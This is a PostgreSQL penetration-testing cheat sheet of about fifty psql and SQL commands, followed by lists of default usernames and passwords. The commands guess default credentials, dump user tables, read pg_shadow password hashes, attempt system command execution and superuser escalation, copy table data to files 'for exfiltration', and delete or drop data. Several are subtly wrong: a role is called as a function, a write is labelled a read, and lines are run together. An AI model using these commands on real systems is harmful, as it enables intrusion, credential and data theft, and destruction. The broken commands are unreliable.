Notes

-Placeholders: Replace <-h host>, <-U username>, <-d database>, <schema_name>, <table_name>, <column_name>, <function_name>, and <sequence_name> with actual values from your target environment.
-Pentesting Context: Commands like 18, 23, 26, 37, 38, and 40 may require superuser privileges or specific server configurations (e.g., pg_execute_server_program enabled or file system access). They’re included to test for misconfigurations or privilege escalation.
-SQL Injection: Command 22 is a basic SQL injection test. In a real pentest, you’d adapt it based on application inputs or use tools like sqlmap.
-Connection Tips: If SSL is required, add sslmode=require to connection strings. Use ~/.pgpass for password automation (host:5437:database:username:password).
-Troubleshooting: If connections fail, verify port 5437 is open (telnet <host> 5437) and check pg_hba.conf for IP restrictions.

1. Connect to the remote database to test access with password prompt. -W flag in psql is used to force a password prompt when connecting to a PostgreSQL database, regardless of whether a password is stored in a configuration file (e.g., ~/.pgpass) or provided via other means (e.g., environment variables like PGPASSWORD).
psql -h  -p 5437 -U  -d  -W

2. Test connection with a default username (e.g., postgres) to check for weak credentials
psql -h  -p 5437 -U postgres -d postgres

3. Connect using a connection string to bypass interactive prompts
psql "host= port=5437 dbname= user= password="

4. Test SSL connection to check server security configuration
psql "host= port=5437 dbname= user= sslmode=require"

5. Switch to a specific database to explore its contents
\c 
Example: \c mydb

6. List all databases to identify potential targets
\l

7. List all schemas to probe database structure
\dn


8. List all tables in the current schema to find data stores
\dt

9. List tables in a specific schema to uncover hidden tables
\dt .*
Example: \dt public.*

10. Describe a table’s structure to identify sensitive columns
\d .
Example: \d public.users

11. List all users and roles to check for privilege escalation opportunities
\du

12. Dump all data from a table to extract sensitive information
SELECT * FROM .;
Example: SELECT * FROM public.users;

13. Test for weak password policies by creating a new user
CREATE USER testuser WITH PASSWORD 'weakpass';

14. Grant all privileges to a user to test for privilege escalation
GRANT ALL PRIVILEGES ON DATABASE  TO testuser;
Example: GRANT ALL PRIVILEGES ON DATABASE mydb TO testuser;

15. List current user’s privileges to verify access level
SELECT * FROM information_schema.table_privileges WHERE grantee = current_user;

16. Extract database version to identify potential vulnerabilities
SELECT version();

17. List active connections to detect other users or sessions
SELECT * FROM pg_stat_activity;

18. Attempt to read pg_shadow to extract hashed passwords
SELECT * FROM pg_shadow;

19. Inject a test record to manipulate data
INSERT INTO . (column_name) VALUES ('testdata');
Example: INSERT INTO public.users (username) VALUES ('testuser');

20. Modify existing data to test write access
UPDATE . SET column_name = 'modified' WHERE id = 1;
Example: UPDATE public.users SET username = 'hacked' WHERE id = 1;

21. Delete records to test destructive permissions
DELETE FROM . WHERE id = 1;
Example: DELETE FROM public.users WHERE id = 1;

22. Test for SQL injection by crafting a malicious query
SELECT * FROM . WHERE column_name = '' OR '1'='1';
Example: SELECT * FROM public.users WHERE username = '' OR '1'='1';

23. Attempt to execute a system command to test for command injection
SELECT * FROM pg_execute_server_program('whoami');

24. List all functions to identify custom or vulnerable functions
\df

25. Inspect a specific function’s definition to check for exploitable code
\df+ 
Example: \df+ public.my_function

26. Create a malicious function to test for privilege abuse
CREATE FUNCTION public.testfunc() RETURNS void AS $$ BEGIN EXECUTE 'SELECT * FROM pg_shadow'; END; $$ LANGUAGE plpgsql;

27. Execute a custom function to test its behavior
SELECT public.testfunc();

28. Drop a function to clean up or test destructive permissions
DROP FUNCTION IF EXISTS public.testfunc;

29. List all database roles to check for misconfigured roles
SELECT * FROM pg_roles;

30. Check if current user is a superuser
SELECT current_user, rolsuper FROM pg_roles WHERE rolname = current_user;

31. Attempt to escalate to superuser to test security boundaries
ALTER USER  WITH SUPERUSER;
Example: ALTER USER testuser WITH SUPERUSER;

32. List table constraints to identify primary keys or foreign keys
\d+ .
Example: \d+ public.users

33. Extract column names from a table to map its structure
SELECT column_name FROM information_schema.columns WHERE table_name = '';
Example: SELECT column_name FROM information_schema.columns WHERE table_name = 'users';

34. Test for unencrypted data by searching for sensitive patterns
SELECT * FROM . WHERE column_name LIKE '%password%';
Example: SELECT * FROM public.users WHERE username LIKE '%admin%';

35. Check for default configuration files in system tables
SELECT * FROM pg_settings;

36. Attempt to read PostgreSQL configuration to identify misconfigurations
SHOW ALL;

37. Test for file read vulnerabilities using COPY
COPY (SELECT 'test') TO '/tmp/testfile';

38. Test for file write vulnerabilities using COPY
COPY . TO '/tmp/dumped_data.csv';
Example: COPY public.users TO '/tmp/dumped_data.csv';

39. List all extensions to check for potentially vulnerable ones
SELECT * FROM pg_available_extensions;

40. Attempt to install an extension to test for privilege abuse
CREATE EXTENSION IF NOT EXISTS pgcrypto;

41. Use pgcrypto to hash data and test encryption capabilities
SELECT crypt('testpass', gen_salt('bf'));

42. Test for schema creation permissions
CREATE SCHEMA testschema;

43. Drop a schema to test destructive permissions
DROP SCHEMA IF EXISTS testschema CASCADE;

44. List all sequences to identify auto-incrementing fields
\ds

45. Modify a sequence to manipulate auto-increment values
ALTER SEQUENCE . RESTART WITH 1000;
Example: ALTER SEQUENCE public.users_id_seq RESTART WITH 1000;

46. Test for trigger creation to manipulate data operations
CREATE TRIGGER test_trigger BEFORE INSERT ON . FOR EACH ROW EXECUTE FUNCTION public.testfunc();
Example: CREATE TRIGGER test_trigger BEFORE INSERT ON public.users FOR EACH ROW EXECUTE FUNCTION public.testfunc();

47. List all triggers to identify potential logic flaws
\dy

48. Drop a trigger to test destructive permissions
DROP TRIGGER IF EXISTS test_trigger ON .;
Example: DROP TRIGGER IF EXISTS test_trigger ON public.users;

49. Test for transaction rollback to undo changes
BEGIN; INSERT INTO . (column_name) VALUES ('test'); ROLLBACK;
Example: BEGIN; INSERT INTO public.users (username) VALUES ('test'); ROLLBACK;

50. Export query results to a file for exfiltration
\o /tmp/output.txtSELECT * FROM .;\o
Example: \o /tmp/users.txt
SELECT * FROM public.users;\o

Default Usernames 
dcmadmin
postgres
admin

Default Passwords
123
admin
passw0rd
postgres
amber
password
